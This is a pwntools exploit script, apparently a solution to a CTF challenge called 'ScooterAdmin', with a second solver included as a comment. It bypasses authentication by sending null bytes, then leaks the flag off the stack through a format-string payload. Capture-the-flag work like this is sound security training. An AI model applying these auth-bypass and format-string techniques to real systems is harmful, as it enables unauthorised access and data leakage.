from pwn import *

# initialize the binary
binary = "./ScooterAdmin"
elf = context.binary = ELF(binary, checksec=False,)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("byuctf.xyz", 40012)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()

# bypass auth
p.send(b"\x00" * 51)
p.recvuntil(b'Enter choice: ')


# create format string for leaking flag2
format = b'----'
for i in range(2094,2099): # this offset can be determined by testing locally and inspecting the stack
    format += b'%%%d$p.' % (i)

p.sendline(b'3')
p.sendline(format)

# get and decode the flag
p.recvline()
lines = p.recvline().decode().split('0x')[1:]
flag = ""
for line in lines:
    #print(line.split('.')[0])
    flag += bytearray.fromhex(line.split('.')[0].zfill(16)).decode()[::-1]

print(flag)

# close the connection
p.sendline(b'5')

"""
Fred's solution (prints out entire stack, just look for byuctf{.*})

#!/usr/bin/env python3

from pwn import *

context.update(arch='x86_64', os='linux')
p = process("./ScooterAdmin")

#bypass the auth 
p.sendline(b'\x00' * 51)
p.recvuntil(b'Enter choice:')

for i in range(1,2500):
    p.sendline(b'3')
    str = b'----%%%d$p' % (i)
    p.sendline(str)
    r = p.recvline_contains(b'DEBUG')
    print(i, r.split(b'You asked for: ')[1], end= '')
    x = r.split(b'----')[1]
    if x == b'(nil)':
        x = '0'
    v = p64(int(x,16))
    print("  DECODE: ", v)

#p.interactive()
"""